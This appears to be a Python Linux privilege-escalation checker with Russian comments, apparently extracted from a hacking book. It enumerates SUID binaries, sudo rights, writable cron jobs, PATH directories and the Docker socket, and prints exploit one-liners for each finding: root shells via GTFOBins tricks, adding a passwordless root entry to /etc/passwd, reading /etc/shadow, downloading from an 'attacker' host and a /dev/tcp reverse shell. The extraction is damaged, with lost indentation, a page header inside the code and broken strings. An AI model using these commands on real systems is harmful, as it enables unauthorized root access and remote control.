#!/usr/bin/env python3
import os
Import re
import subprocess
import stat
import pwd
import grp
import argparse
from pathlib import Path
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
results = {"CRITICAL": [], "HIGH": [], "INFO": []}
def check(severity: str, name: str, description: str, exploit: str = "") -> None:
"""Добавляем находку с уровнем критичности."""
results[severity].append({"name": name, "desc": description, "exploit": exploit})
color = RED if severity == "CRITICAL" else (YELLOW if severity == "HIGH" else
CYAN)
print(f" {color}[{severity}] {name}: {description}{RESET}")
if exploit:
print(f" {GREEN}→ Эксплойт: {exploit}{RESET}")
def run_cmd(cmd: str) -> str:
"""Выполняем команду и возвращаем вывод."""
try:
return subprocess.check_output(cmd, shell=True,
stderr=subprocess.DEVNULL,
text=True, timeout=10)
except Exception:
return ""
def check_suid_sgid() -> None:
"""SUID/SGID бинари — запускаются с правами владельца (часто root)."""
print(f"\n{YELLOW}[*] SUID/SGID бинари{RESET}")
# Известные эксплуатируемые SUID бинари (GTFOBins)
gtfobins_suid = {
"python": "python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
"python3": "python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
"perl":
 "perl -e 'use POSIX qw(setuid); setuid(0); exec \"/bin/sh\"'",
"ruby":
 "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'",
"bash":
 "bash -p",
"dash":
 "dash -p",
"find":
 "find / -exec /bin/sh -p \\; -quit",
"vim":
 "vim -c ':!id'",
"nano":
 "nano (edit /etc/passwd или /etc/sudoers)",
"less":
 "less /etc/passwd → !/bin/sh",
"more":
 "more /etc/passwd → !/bin/sh",
"awk":
 "awk 'BEGIN {system(\"/bin/sh\")}'",
— 207 —
30 Python-скриптов для Хакинга
"nmap":
 "nmap --interactive → !sh",
"cp":
 "cp /bin/sh /tmp/sh; cp source target",
"mv":
 "mv source target",
"tee":
 "echo root2::0:0::/root:/bin/bash | tee -a /etc/passwd",
"wget":
 "wget http://attacker/shell -O /tmp/shell",
"curl":
 "curl http://attacker/shell -o /tmp/shell",
"tar":
 "tar -cf /dev/null /dev/null --checkpoint=1
--checkpoint-action=exec=/bin/sh",
"zip":
 "zip /tmp/exploit.zip /tmp/exploit -T --unzip-command='sh -c
/bin/sh'",
"env":
 "env /bin/sh -p",
"strace": "strace -o /dev/null /bin/sh -p",
"taskset": "taskset 1 /bin/sh -p",
"nice":
 "nice /bin/sh -p",
"ionice": "ionice /bin/sh -p",
"base64": "base64 /etc/shadow | base64 -d",
"xxd":
 "xxd /etc/shadow | xxd -r",
}
suid_output = run_cmd("find / -perm -4000 -type f 2>/dev/null")
sgid_output = run_cmd("find / -perm -2000 -type f 2>/dev/null")
for line in (suid_output + sgid_output).split("\n"):
if not line.strip():
continue
binary_name = os.path.basename(line.strip())
if binary_name in gtfobins_suid:
check("CRITICAL", f"SUID {binary_name}",
f"Найден SUID бинарь: {line.strip()}",
gtfobins_suid[binary_name])
else:
if any(binary_name.startswith(p) for p in
["python", "perl", "ruby", "php", "node", "lua"]):
check("HIGH", f"SUID interpreter: {binary_name}",
f"Найден SUID интерпретатор: {line.strip()}")
def check_sudo_rights() -> None:
"""sudo без пароля или с широкими правами."""
print(f"\n{YELLOW}[*] Sudo права{RESET}")
sudo_output = run_cmd("sudo -l 2>/dev/null")
if not sudo_output:
return
if "NOPASSWD: ALL" in sudo_output:
check("CRITICAL", "sudo NOPASSWD ALL",
"sudo ALL без пароля!",
"sudo /bin/bash")
elif "NOPASSWD" in sudo_output:
# Ищем конкретные команды
for line in sudo_output.split("\n"):
if "NOPASSWD" in line:
check("HIGH", "sudo NOPASSWD",
f"sudo без пароля: {line.strip()}")
def check_writable_crons() -> None:
"""Cron задачи с правами записи."""
print(f"\n{YELLOW}[*] Cron задачи{RESET}")
cron_paths = [
"/etc/crontab",
"/etc/cron.d/",
"/etc/cron.daily/",
"/etc/cron.weekly/",
"/var/spool/cron/",
]
for cron_path in cron_paths:
if not os.path.exists(cron_path):
continue
files = [cron_path] if os.path.isfile(cron_path) else \
[os.path.join(cron_path, f) for f in os.listdir(cron_path)]
for filepath in files:
try:
file_stat = os.stat(filepath)
# Writable другими пользователями
if file_stat.st_mode & stat.S_IWOTH:
check("CRITICAL", "Writable Cron",
f"Cron файл доступен для записи: {filepath}",
f"echo '* * * * * root chmod +s /bin/bash' >> {filepath}")
# Читаем содержимое для анализа скриптов
with open(filepath, encoding="utf-8", errors="ignore") as f:
content = f.read()
# Ищем скрипты вызываемые из cron
scripts = re.findall(r'(/[^\s]+\.sh|/[^\s]+\.py|/usr/bin/\S+)',
content)
for script in scripts:
if os.path.exists(script):
s = os.stat(script)
if s.st_mode & stat.S_IWOTH:
check("CRITICAL", "Writable Cron Script",
f"Скрипт из cron доступен для записи: {script}",
f"echo 'chmod +s /bin/bash' >> {script}")
except (PermissionError, OSError):
pass
def check_capabilities() -> None:
"""Linux capabilities — мелкие привилегии root."""
print(f"\n{YELLOW}[*] Linux Capabilities{RESET}")
caps_output = run_cmd("getcap -r / 2>/dev/null")
dangerous_caps = {
"cap_setuid": "Может устанавливать UID → root",
"cap_setgid": "Может устанавливать GID",
"cap_sys_admin": "Почти всё что root",
"cap_net_raw": "Raw sockets → снифинг",
"cap_dac_override": "Обходит проверки прав на файлы",
}
for line in caps_output.split("\n"):
if not line.strip():
continue
for cap, desc in dangerous_caps.items():
if cap in line.lower():
binary = line.split("=")[0].strip()
check("HIGH", f"Capability: {cap}",
f"{binary}: {desc}")
def check_writable_paths() -> None:
"""Writable файлы и директории в PATH."""
print(f"\n{YELLOW}[*] Writable PATH{RESET}")
path_dirs = os.environ.get("PATH", "").split(":")
for path_dir in path_dirs:
if not path_dir or not os.path.exists(path_dir):
continue
try:
if os.access(path_dir, os.W_OK):
check("HIGH", "Writable PATH dir",
f"Директория {path_dir} доступна для записи",
f"echo '#!/bin/bash\\nbash -i >& /dev/tcp/attacker/4444 0>&1' >
{path_dir}/ls && chmod +x {path_dir}/ls")
except Exception:
pass
def check_docker_socket() -> None:
"""Docker socket — полный доступ к системе."""
print(f"\n{YELLOW}[*] Docker Socket{RESET}")
docker_socket = "/var/run/docker.sock"
if os.path.exists(docker_socket):
try:
if os.access(docker_socket, os.R_OK | os.W_OK):
check("CRITICAL", "Docker Socket",
"Доступен /var/run/docker.sock!",
"docker run -v /:/mnt --rm -it alpine chroot /mnt sh")
except Exception:
pass
def check_kernel_version() -> None:
"""Версия ядра на известные уязвимости."""
print(f"\n{YELLOW}[*] Версия ядра{RESET}")
kernel = run_cmd("uname -r").strip()
if not kernel:
return
print(f" {CYAN}Ядро: {kernel}{RESET}")
# Известные уязвимые версии (примеры)
vulnerable_kernels = {
"dirty_cow": ("2.6.22", "4.8.3", "CVE-2016-5195: Dirty COW — write to
read-only mapping"),
"dirty_pipe": ("5.8.0", "5.16.11", "CVE-2022-0847: Dirty Pipe — overwrite
read-only files"),
}
# Простая проверка по основной версии
major_minor = ".".join(kernel.split(".")[:2])
for vuln, (min_ver, max_ver, desc) in vulnerable_kernels.items():
try:
kernel_num = float(major_minor)
min_num = float(".".join(min_ver.split(".")[:2]))
max_num = float(".".join(max_ver.split(".")[:2]))
if min_num <= kernel_num <= max_num:
check("HIGH", f"Vulnerable Kernel: {vuln}",
f"Ядро {kernel} потенциально уязвимо. {desc}")
except ValueError:
pass
def check_interesting_files() -> None:
"""Интересные файлы с credentials или повышенными правами."""
print(f"\n{YELLOW}[*] Интересные файлы{RESET}")
interesting = [
("/etc/sudoers",
 "Конфигурация sudo"),
("/etc/sudoers.d/",
 "Дополнительные sudo правила"),
("/root/.bash_history", "История команд root"),
("/root/.ssh/id_rsa", "SSH ключ root"),
("/home/*/backup*.tar", "Архивы"),
]
for filepath, desc in interesting:
if os.path.exists(filepath):
if os.access(filepath, os.R_OK):
check("HIGH", f"Readable: {os.path.basename(filepath)}",
f"{filepath}: {desc}")
def main():
print(f"{CYAN}{'='*60}")
print(" Linux Privilege Escalation Checker")
print(f" User: {run_cmd('id').strip()}")
print(f" Hostname: {run_cmd('hostname').strip()}")
print(f"{'='*60}{RESET}")
check_suid_sgid()
check_sudo_rights()
check_writable_crons()
check_capabilities()
check_writable_paths()
check_docker_socket()
check_kernel_version()
check_interesting_files()
# Итоговый отчёт
print(f"\n{GREEN}{'='*60}")
print(" ИТОГОВЫЙ ОТЧЁТ")
print(f"{'='*60}{RESET}")
for severity in ("CRITICAL", "HIGH", "INFO"):
items = results[severity]
if items:
color = RED if severity == "CRITICAL" else \
(YELLOW if severity == "HIGH" else CYAN)
print(f"\n{color}[{severity}] {len(items)} находок:{RESET}")
for item in items:
print(f" • {item['name']}: {item['desc'][:80]}")
total = sum(len(v) for v in results.values())
print(f"\n{CYAN}Проверено векторов. Всего находок: {total}{RESET}")
print(f"{YELLOW}[!] Для более глубокой проверки используй LinPEAS{RESET}")
if __name__ == "__main__":
main()
